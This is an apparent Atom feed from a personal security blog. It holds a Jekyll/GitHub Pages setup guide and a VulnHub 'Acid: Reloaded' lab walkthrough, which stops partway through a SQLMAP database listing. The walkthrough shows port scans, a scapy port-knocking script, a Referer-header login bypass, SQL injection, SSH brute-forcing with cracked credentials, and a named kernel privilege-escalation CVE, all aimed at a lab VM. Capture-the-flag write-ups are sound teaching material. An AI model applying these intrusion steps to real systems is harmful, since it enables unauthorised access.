<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[F4l13n5n0w]]></title>
  <link href="http://f4l13n5n0w.github.io/atom.xml" rel="self"/>
  <link href="http://f4l13n5n0w.github.io/"/>
  <updated>2015-10-03T11:05:51-04:00</updated>
  <id>http://f4l13n5n0w.github.io/</id>
  <author>
    <name><![CDATA[F4l13n5n0w]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[[Notes] Setup jekyll Harmony theme on GitHub]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2015/10/03/welcome-and-thanks/"/>
    <updated>2015-10-03T07:05:12-04:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2015/10/03/welcome-and-thanks</id>
    <content type="html"><![CDATA[<h1>Setup jekyll theme blog on <a href="https://pages.github.com/" title="GitHub Pages">github pages</a></h1>

<p><strong><font color="red">[!!]</font> Now I have moved my blog back to <a href="http://octopress.org/" title="Octopress -- A blogging framework for hackers">Octopress</a> with <a href="https://github.com/macjasp/cleanpress" title="Octopress Theme CleanPress">CleanPress</a> theme. However the last two days playing with Harmony pushed me to get a further understanding about github, github pages and jekyll.</strong></p>

<!-- more -->


<p>I am using the Jekyll theme: <a href="https://github.com/gayanvirajith/Harmony" title="Jekyll Theme Harmony">Harmony</a></p>

<p>If you are new to github/git, the following link is highly recommanded to check first: <a href="https://try.github.io/levels/1/challenges/1" title="Try github in 15 mins">Learn git in 15 mins</a></p>

<p>If you want to try it on your local system, you probably will be asked to install the latest Ruby. Because Jekyll requires Ruby 2.0.0 or above, you can <a href="https://rvm.io/rvm/install" title="Install RVM">install RVM</a> in following commands (in this case I use Kali Linux, step this if you are using Kali 2):</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c"># install RVM mpapis public key</span>
gpg --keyserver hkp://keys.gnupg.net --recv-keys 409B6B1796C275462A1703113804BB82D39DC0E3
<span class="c"># download and install RVM stable with latest ruby</span>
<span class="se">\c</span>url -sSL https://get.rvm.io <span class="p">|</span> bash -s stable --ruby
<span class="c"># after installed, to start using RVM</span>
<span class="nb">source</span> /usr/local/rvm/scripts/rvm
<span class="c"># check current ruby version</span>
ruby --version</code></pre></div>


<h2>Set up jerkll theme on local system (Kali Linux):</h2>

<ol>
<li><p><a href="https://help.github.com/articles/create-a-repo/" title="Create a Repo">Create a Repo</a> on github (Note: In order to use Free github page domain, this Repo must use your github username as the repo name: <code>f4l13n5n0w.github.io</code> in my case</p></li>
<li><p>run the following commands in my Kali linux:</p></li>
</ol>


<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">cd</span> /opt
<span class="c"># download Jekyll theme on my local system</span>
git clone https://github.com/gayanvirajith/harmony.git
<span class="nb">cd </span>harmony
<span class="c"># install bundler</span>
gem install bundler
<span class="c"># install dependencies by using bundle</span>
bundle install
<span class="c"># set it up on local, will listen on http://127.0.0.1:4000</span>
jekyll serve</code></pre></div>


<p>You might get the following error when run <code>jekyll serve</code>.</p>

<pre><code>root@kali:/opt/harmony# jekyll serve
/usr/local/rvm/gems/ruby-2.2.1/gems/execjs-2.6.0/lib/execjs/runtimes.rb:48:in `autodetect': Could not find a JavaScript runtime. See https://github.com/rails/execjs for a list of available runtimes. (ExecJS::RuntimeUnavailable)
    from /usr/local/rvm/gems/ruby-2.2.1/gems/execjs-2.6.0/lib/execjs.rb:5:in `&lt;module:ExecJS&gt;'
    from /usr/local/rvm/gems/ruby-2.2.1/gems/execjs-2.6.0/lib/execjs.rb:4:in `&lt;top (required)&gt;'
    from /usr/local/rvm/gems/ruby-2.2.1/gems/coffee-script-2.4.1/lib/coffee_script.rb:1:in `require'
    from /usr/local/rvm/gems/ruby-2.2.1/gems/coffee-script-2.4.1/lib/coffee_script.rb:1:in `&lt;top (required)&gt;'
    from /usr/local/rvm/gems/ruby-2.2.1/gems/coffee-script-2.4.1/lib/coffee-script.rb:1:in `require'
    from /usr/local/rvm/gems/ruby-2.2.1/gems/coffee-script-2.4.1/lib/coffee-script.rb:1:in `&lt;top (required)&gt;'
    from /usr/local/rvm/gems/ruby-2.2.1/gems/jekyll-coffeescript-1.0.1/lib/jekyll-coffeescript.rb:2:in `require'
    from /usr/local/rvm/gems/ruby-2.2.1/gems/jekyll-coffeescript-1.0.1/lib/jekyll-coffeescript.rb:2:in `&lt;top (required)&gt;'
    from /usr/local/rvm/gems/ruby-2.2.1/gems/jekyll-2.4.0/lib/jekyll/deprecator.rb:46:in `require'
    from /usr/local/rvm/gems/ruby-2.2.1/gems/jekyll-2.4.0/lib/jekyll/deprecator.rb:46:in `block in gracefully_require'
    from /usr/local/rvm/gems/ruby-2.2.1/gems/jekyll-2.4.0/lib/jekyll/deprecator.rb:44:in `each'
    from /usr/local/rvm/gems/ruby-2.2.1/gems/jekyll-2.4.0/lib/jekyll/deprecator.rb:44:in `gracefully_require'
    from /usr/local/rvm/gems/ruby-2.2.1/gems/jekyll-2.4.0/lib/jekyll.rb:141:in `&lt;top (required)&gt;'
    from /usr/local/rvm/gems/ruby-2.2.1/gems/jekyll-2.4.0/bin/jekyll:6:in `require'
    from /usr/local/rvm/gems/ruby-2.2.1/gems/jekyll-2.4.0/bin/jekyll:6:in `&lt;top (required)&gt;'
    from /usr/local/rvm/gems/ruby-2.2.1/bin/jekyll:23:in `load'
    from /usr/local/rvm/gems/ruby-2.2.1/bin/jekyll:23:in `&lt;main&gt;'
    from /usr/local/rvm/gems/ruby-2.2.1/bin/ruby_executable_hooks:15:in `eval'
    from /usr/local/rvm/gems/ruby-2.2.1/bin/ruby_executable_hooks:15:in `&lt;main&gt;'
</code></pre>

<p>In order to fix it up, you need to insert <code>gem 'therubyracer'</code> into the file <code>Gemfile</code> as follow and run <code>bundle install</code> again (Note: github-page server do not have this problem):</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='yaml'><span class='line'><span class="l-Scalar-Plain">source &#39;https://rubygems.org&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="l-Scalar-Plain">require &#39;json&#39;</span>
</span><span class='line'><span class="l-Scalar-Plain">require &#39;open-uri&#39;</span>
</span><span class='line'><span class="l-Scalar-Plain">versions = JSON.parse(open(&#39;https://pages.github.com/versions.json&#39;).read)</span>
</span><span class='line'>
</span><span class='line'><span class="l-Scalar-Plain">gem &#39;therubyracer&#39;</span>
</span><span class='line'><span class="l-Scalar-Plain">gem &#39;github-pages&#39;, versions[&#39;github-pages&#39;]</span>
</span><span class='line'><span class="l-Scalar-Plain">gem &#39;rake&#39;</span>
</span></code></pre></td></tr></table></div></figure>


<p>If everything is good, after run <code>jekyll serve</code>, you will be able to access your blog on <code>http://127.0.0.1:4000</code></p>

<p>Next important thing is to modify the configuration file <code>_config.yml</code>.</p>

<p>The paramters <code>baseurl</code> and <code>url</code> have to be set correctly in order to make your site works</p>

<p><font color="red">Note:</font>
If you are going to set the blog under the root directory, you have to set <code>baseurl</code> to <code> or ''</code> as follow (<em><font color="red">DO NOT</font> set it to &lsquo;/&rsquo;</em>):</p>

<pre><code># Base URL
baseurl: 

# Site live URL
# url: http://f4l13n5n0w.github.io

# Localhost 
url: http://127.0.0.1:4000  
</code></pre>

<p>Set <code>url</code> to <code>http://127.0.0.1:4000</code> when developing locally and <font color="red">DO NOT</font> forget to change it back to your github page&rsquo;s link (in my case is <a href="http://f4l13n5n0w.github.io">http://f4l13n5n0w.github.io</a>)</p>

<h2>Update your site to github</h2>

<p>After you customized your blog locally, using the following code to publish it to github.</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">cd</span> /opt/harmony
rm -rf _site
<span class="nb">cd</span> /opt
<span class="c"># git clone my blog Repo on my local system</span>
git clone https://github.com/F4l13n5n0w/F4l13n5n0w.github.io.git
<span class="nb">cd </span>F4l13n5n0w.github.io
<span class="c"># copy all the files from Jekyll theme to my blog repo</span>
cp -rf ../harmony/* ./
git add --all
git commit -m <span class="s1">&#39;Initial website&#39;</span>
<span class="c"># push it back to github, now wait couple of seconds or even minutes, you will find your blog already up from the github.io link (in my case: http://f4l13n5n0w.github.io)</span>
git push origin master</code></pre></div>


<h2>Further reading</h2>

<ul>
<li><a href="https://daringfireball.net/projects/markdown/syntax">Markdown syntax</a></li>
<li><a href="https://daringfireball.net/projects/markdown/basics">Markdown basics</a></li>
<li><a href="https://github.com/adam-p/markdown-here/wiki/Markdown-Cheatsheet">Markdown cheatsheet</a></li>
<li><a href="https://help.github.com/index.html">GitHub Help</a></li>
</ul>


<h2>Special Thanks</h2>

<p>After two nights scratching hair and friends' help, I finally got my blog back with refresh theme!</p>

<p><a href="http://www.anthonyferrillo.net/blog/">Anthony Ferrillo</a>
Bumped into his blog when I was checking new challenges on <a href="https://www.vulnhub.com/" title="VulnHub">VulnHub</a>, then I make myself incorrigible to upgrade my blog to the new beautiful theme. T.T</p>

<p><a href="http://gayan.me/">Gayan Virajith</a>
The coder of the Harmony theme, whom is very patient and helpful. Very nice and tidy theme, great job~</p>

<p>Special Thanks to you guys for your time and quick reply when I got stuck in setting this up, help and guide me to put it through. All great people and nice to chat with you~</p>

<!--- Reference -->



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[Vulnhub]acid_reloaded]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2015/09/12/acid-reloaded/"/>
    <updated>2015-09-12T07:49:42-04:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2015/09/12/acid-reloaded</id>
    <content type="html"><![CDATA[<p>Acid: Reloaded is created by <a href="https://twitter.com/@m_avinash143">Avinash Kumar Thapa</a></p>

<p>More information and OVA file download please check <a href="https://www.vulnhub.com/entry/acid-reloaded,127/">here</a>.</p>

<h2>Links</h2>

<p>watch video online:</p>

<iframe src='http://player.vimeo.com/video/139052982?byline=0&amp;portrait=0&amp;color=c9ff23' width='720' height='360' frameborder='0' webkitAllowFullScreen mozallowfullscreen allowFullScreen></iframe>


<!-- more -->


<h2>Attacker &amp; Target</h2>

<p>Attacker: Kali Linux (<em>10.1.1.139/24</em>)</p>

<p>Target: Acid: Server (<em>10.1.1.130/24</em>)</p>

<h2>Vulnerability &amp; Exploit</h2>

<ul>
<li>Ports knocking to active hidden ports</li>
<li>Hidden paths and files can be found via tool <code>dirbuster</code></li>
<li>Web login bypass by add HTTP header <code>Referer</code> in Request</li>
<li>SQL injection vulnerability exists in <code>http://10.1.1.139:33447/bin/l33t_haxor.php?id=</code>, exploit it and check database to find hidden file location <code>UB3R/strcpy.exe</code></li>
<li>Download and analyze the EXE file, found it binded with other files, use <code>foremost</code> tool to recover hidden files and find XML contacts file <code>Avinash.contact</code></li>
<li>Making a dictionary file from the contact file, here need to note that there is a base64 encoded string, decode it and put in dictionary file</li>
<li>use HYDRA to brute force SSH service with dictionary file and found cracked login <code>makke/NooB@123</code></li>
<li>Login as user <code>makke</code>, poking around and found Overlayfs Local Root (CVE-2015-1328) vulnerability exist and exploit it to get ROOT</li>
<li>overlayfs Local Root exploit (CVE-2015-1328) exist, exploit it to get ROOT</li>
</ul>


<h2>Method</h2>

<ul>
<li>Scanned the network to discover the target server [<font color="FF8000">arp-scan</font>]</li>
<li>Port scanned the target to discover the running services and open ports [<font color="FF8000">unicornscan</font> &amp; <font color="FF8000">nmap</font>]</li>
<li>Write python script to make port knocking to active filtered ports</li>
<li>Web information gathering and interacting with the web server [<font color="FF8000">firefox</font>]</li>
<li>Web application scanning by Nikto to find more details or vulnerabilities [<font color="FF8000">nikto</font>]</li>
<li>Brute force scan to find hidden path [<font color="FF8000">dirbuster</font>]</li>
<li>Found the hidden web login page and bypass it</li>
<li>Exploit SQL injection vulnerability found in <code>/bin/l33t_haxor.php?id=</code> to get hidden file location <code>UB3R/strcpy.exe</code></li>
<li>Use <code>foremost</code> to recover hidden files in <code>strcpy.exe</code> [<font color="FF8000">foremost</font>]</li>
<li>Create dictionary file and use HYDRA to brute force SSH login, and found <code>makke/NooB@123</code></li>
<li>Enumeration and found the server is vulnerable to CVE-2015-1328, exploit it to get ROOT</li>
</ul>


<h2>Tools</h2>

<p>All the tools used here can be found in Kali Linux</p>

<ul>
<li><a href="http://linux.die.net/man/1/arp-scan">arp-scan</a></li>
<li><a href="https://github.com/dneufeld/unicornscan">unicornscan</a></li>
<li><a href="https://nmap.org/">nmap</a></li>
<li><a href="https://www.mozilla.org/en-US/firefox/new/">firefox</a></li>
<li><a href="https://cirt.net/Nikto2">nikto</a></li>
<li><a href="https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project">dirbuster</a></li>
<li><a href="https://portswigger.net/burp/">burp suite</a></li>
<li><a href="http://foremost.sourceforge.net/">foremost</a></li>
<li><a href="https://www.thc.org/thc-hydra/">hydra</a></li>
</ul>


<h2>Walkthrough</h2>

<p>Using arp-scan as routine to detect the target&rsquo;s IP address (10.1.1.139 in this case).</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# arp-scan -l
</span><span class='line'>Interface: eth0, datalink type: EN10MB (Ethernet)
</span><span class='line'>Starting arp-scan 1.9 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
</span><span class='line'>10.1.1.1  00:50:56:c0:00:08   VMware, Inc.
</span><span class='line'>10.1.1.2  00:50:56:fd:d1:6b   VMware, Inc.
</span><span class='line'>10.1.1.139    00:0c:29:bb:6e:b3   VMware, Inc.
</span><span class='line'>10.1.1.254    00:50:56:e3:03:1b   VMware, Inc.
</span><span class='line'>
</span><span class='line'>4 packets received by filter, 0 packets dropped by kernel
</span><span class='line'>Ending arp-scan 1.9: 256 hosts scanned in 2.611 seconds (98.05 hosts/sec). 4 responded</span></code></pre></td></tr></table></div></figure>


<p>10.1.1.139 is our Target!</p>

<p>Then run uniscornscan to detect opening ports on the target (unicornscan is much faster than nmap when doing a full ports scan, so here I use it to make a full scan and then use nmap to do a deep scan on target ports).</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# us -msf -T4 -p1-65535 -Iv 10.1.1.139
</span><span class='line'>adding 10.1.1.139/32 mode `TCPscan' ports `1-65535' pps 300
</span><span class='line'>using interface(s) eth0
</span><span class='line'>scaning 1.00e+00 total hosts with 6.55e+04 total packets, should take a little longer than 3 Minutes, 45 Seconds
</span><span class='line'>connected 10.1.1.130:39969 -> 10.1.1.139:22
</span><span class='line'>TCP open 10.1.1.139:22  ttl 64
</span><span class='line'>sender statistics 288.7 pps with 65535 packets sent total
</span><span class='line'>listener statistics 131072 packets recieved 0 packets droped and 0 interface drops
</span><span class='line'>TCP open               ssh[   22]     from 10.1.1.139  ttl 64</span></code></pre></td></tr></table></div></figure>


<p>Then I connect to target via SSH to grab banner.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# ssh 10.1.1.139
</span><span class='line'>    _    ____ ___ ____        ____  _____ _     ___    _    ____  _____ ____  
</span><span class='line'>   / \  / ___|_ _|  _ \      |  _ \| ____| |   / _ \  / \  |  _ \| ____|  _ \ 
</span><span class='line'>  / _ \| |    | || | | |_____| |_) |  _| | |  | | | |/ _ \ | | | |  _| | | | |
</span><span class='line'> / ___ \ |___ | || |_| |_____|  _ &lt;| |___| |__| |_| / ___ \| |_| | |___| |_| |
</span><span class='line'>/_/   \_\____|___|____/      |_| \_\_____|_____\___/_/   \_\____/|_____|____/ 
</span><span class='line'>
</span><span class='line'>                                  -by Acid
</span><span class='line'>
</span><span class='line'>Wanna Knock me out ??? 
</span><span class='line'>3.2.1 Let's Start the Game.
</span><span class='line'>                                                                              
</span><span class='line'>root@10.1.1.139's password:</span></code></pre></td></tr></table></div></figure>


<p>Looks like we need ports knocking to find hidden ports. Then the following python script will do the port knocking</p>

<figure class='code'><figcaption><span>knock.py </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">from</span> <span class="nn">scapy.all</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'>
</span><span class='line'><span class="n">target</span> <span class="o">=</span> <span class="s">&#39;10.1.1.139&#39;</span>
</span><span class='line'><span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">reversed</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">4</span><span class="p">)):</span>
</span><span class='line'>    <span class="n">packet</span> <span class="o">=</span> <span class="n">IP</span><span class="p">(</span><span class="n">dst</span><span class="o">=</span><span class="n">target</span><span class="p">)</span><span class="o">/</span><span class="n">TCP</span><span class="p">(</span><span class="n">dport</span><span class="o">=</span><span class="n">x</span><span class="p">,</span> <span class="n">flags</span><span class="o">=</span><span class="s">&quot;S&quot;</span><span class="p">)</span>
</span><span class='line'>    <span class="n">response</span> <span class="o">=</span> <span class="n">sr1</span><span class="p">(</span><span class="n">packet</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mf">0.5</span><span class="p">,</span> <span class="n">verbose</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
</span><span class='line'>    <span class="k">if</span> <span class="n">response</span> <span class="o">!=</span> <span class="bp">None</span><span class="p">:</span>
</span><span class='line'>        <span class="k">print</span> <span class="s">&#39;[+]knocking port &#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[+]Done!&quot;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Then use unicornscan to check again, found another port <code>33447</code></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/acid_reload# us -msf -T4 -p1-65535 -Iv 10.1.1.139
</span><span class='line'>adding 10.1.1.139/32 mode `TCPscan' ports `1-65535' pps 300
</span><span class='line'>using interface(s) eth0
</span><span class='line'>scaning 1.00e+00 total hosts with 6.55e+04 total packets, should take a little longer than 3 Minutes, 45 Seconds
</span><span class='line'>connected 10.1.1.130:22339 -> 10.1.1.139:22
</span><span class='line'>TCP open 10.1.1.139:22  ttl 64
</span><span class='line'>connected 10.1.1.130:38957 -> 10.1.1.139:33447
</span><span class='line'>TCP open 10.1.1.139:33447  ttl 64
</span><span class='line'>sender statistics 277.8 pps with 65535 packets sent total
</span><span class='line'>listener statistics 131078 packets recieved 0 packets droped and 0 interface drops
</span><span class='line'>TCP open               ssh[   22]     from 10.1.1.139  ttl 64 
</span><span class='line'>TCP open           unknown[33447]     from 10.1.1.139  ttl 64</span></code></pre></td></tr></table></div></figure>


<p>Using NMAP scan to detect more information about opening services, and found WEB service is running on port <code>33447</code></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/acid_reload# nmap -sV -v -p22,33447 -T4 10.1.1.139
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.49BETA4 ( https://nmap.org ) at 2015-09-11 07:26 EDT
</span><span class='line'>NSE: Loaded 33 scripts for scanning.
</span><span class='line'>Initiating ARP Ping Scan at 07:26
</span><span class='line'>Scanning 10.1.1.139 [1 port]
</span><span class='line'>Completed ARP Ping Scan at 07:26, 0.24s elapsed (1 total hosts)
</span><span class='line'>Initiating Parallel DNS resolution of 1 host. at 07:26
</span><span class='line'>Completed Parallel DNS resolution of 1 host. at 07:26, 0.02s elapsed
</span><span class='line'>Initiating SYN Stealth Scan at 07:26
</span><span class='line'>Scanning 10.1.1.139 [2 ports]
</span><span class='line'>Discovered open port 22/tcp on 10.1.1.139
</span><span class='line'>Discovered open port 33447/tcp on 10.1.1.139
</span><span class='line'>Completed SYN Stealth Scan at 07:26, 0.21s elapsed (2 total ports)
</span><span class='line'>Initiating Service scan at 07:26
</span><span class='line'>Scanning 2 services on 10.1.1.139
</span><span class='line'>Completed Service scan at 07:26, 11.04s elapsed (2 services on 1 host)
</span><span class='line'>NSE: Script scanning 10.1.1.139.
</span><span class='line'>Initiating NSE at 07:26
</span><span class='line'>Completed NSE at 07:26, 0.34s elapsed
</span><span class='line'>Nmap scan report for 10.1.1.139
</span><span class='line'>Host is up (0.00050s latency).
</span><span class='line'>PORT      STATE SERVICE VERSION
</span><span class='line'>22/tcp    open  ssh     OpenSSH 6.7p1 Ubuntu 5ubuntu1.3 (Ubuntu Linux; protocol 2.0)
</span><span class='line'>33447/tcp open  http    Apache httpd 2.4.10 ((Ubuntu))
</span><span class='line'>MAC Address: 00:0C:29:BB:6E:B3 (VMware)
</span><span class='line'>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span><span class='line'>
</span><span class='line'>Read data files from: /usr/bin/../share/nmap
</span><span class='line'>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 12.65 seconds
</span><span class='line'>           Raw packets sent: 3 (116B) | Rcvd: 3 (116B)</span></code></pre></td></tr></table></div></figure>


<p>Run NIKTO scan to check the web application and found hidden folder <code>/bin/</code></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# nikto -host http://10.1.1.139:3344/
</span><span class='line'>- Nikto v2.1.6
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ No web server found on 10.1.1.139:3344
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ 0 host(s) tested
</span><span class='line'>root@kali:~# nikto -host http://10.1.1.139:33447/
</span><span class='line'>- Nikto v2.1.6
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ Target IP:          10.1.1.139
</span><span class='line'>+ Target Hostname:    10.1.1.139
</span><span class='line'>+ Target Port:        33447
</span><span class='line'>+ Start Time:         2015-09-11 07:31:36 (GMT-4)
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ Server: Apache/2.4.10 (Ubuntu)
</span><span class='line'>+ Server leaks inodes via ETags, header found with file /, fields: 0x2aa 0x51e107200fa1d 
</span><span class='line'>+ The anti-clickjacking X-Frame-Options header is not present.
</span><span class='line'>+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
</span><span class='line'>+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
</span><span class='line'>+ IP address found in the 'location' header. The IP is "127.0.1.1".
</span><span class='line'>+ OSVDB-630: IIS may reveal its internal or real IP in the Location header via a request to the /images directory. The value is "http://127.0.1.1:33447/images/".
</span><span class='line'>+ Apache/2.4.10 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.
</span><span class='line'>+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
</span><span class='line'>+ OSVDB-3092: /bin/: This might be interesting...
</span><span class='line'>+ OSVDB-3092: /bin/: This might be interesting... possibly a system shell found.
</span><span class='line'>+ OSVDB-3233: /icons/README: Apache default file found.
</span><span class='line'>+ 8330 requests: 0 error(s) and 11 item(s) reported on remote host
</span><span class='line'>+ End Time:           2015-09-11 07:31:58 (GMT-4) (22 seconds)
</span><span class='line'>---------------------------------------------------------------------------</span></code></pre></td></tr></table></div></figure>


<p>check the new folder <code>/bin/</code> found a login page. By checking the source code, the login process function is in <code>/includes/validation.php</code></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;h2&gt;</span>Login to your account<span class="nt">&lt;/h2&gt;</span>   <span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">&quot;includes/validation.php&quot;</span> <span class="na">method=</span><span class="s">&quot;post&quot;</span> <span class="na">name=</span><span class="s">&quot;login_form&quot;</span><span class="nt">&gt;</span>  Email: <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;text&quot;</span> <span class="na">placeholder=</span><span class="s">&quot;Email Address&quot;</span> <span class="na">name=</span><span class="s">&quot;email&quot;</span> <span class="na">maxlength=</span><span class="s">&quot;20&quot;</span> <span class="nt">/&gt;</span>  Password: <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;password&quot;</span> <span class="na">placeholder=</span><span class="s">&quot;Password&quot;</span> <span class="na">name=</span><span class="s">&quot;password&quot;</span> <span class="na">id=</span><span class="s">&quot;password&quot;</span><span class="nt">/&gt;</span>  <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;submit&quot;</span> <span class="na">value=</span><span class="s">&quot;Login&quot;</span> <span class="na">onclick=</span><span class="s">&quot;formhash(this.form, this.form.password);&quot;</span> <span class="nt">/&gt;</span>  <span class="nt">&lt;/form&gt;</span>   <span class="nt">&lt;/form&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Then using dirbuster to brute force hidden files and paths and found the page <code>/bin/dashboard.php</code></p>

<p>After a lot of failed tests, I finally found that HTTP header trick to bypass the login by adding the header <code>Referere: http://10.1.1.139:33447/bin/includes/validation.php</code>, Burp proxy help me to get next step.</p>

<p>Then I reach here <code>http://10.1.1.139:33447/bin/l33t_haxor.php</code>, by checking the source code I found the following URL <code>http://10.1.1.139:33447/bin/l33t_haxor.php?id=</code> and the parameter <code>id</code> is SQL injectable.</p>

<p>Using SQLMAP to exploit the SQL injection vulnerability and found the current database and tables:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>...
</span><span class='line'>available databases [4]:                                                                                                                                                           
</span><span class='line'>[*] information_schema
</span><span class='line'>[*] mysql
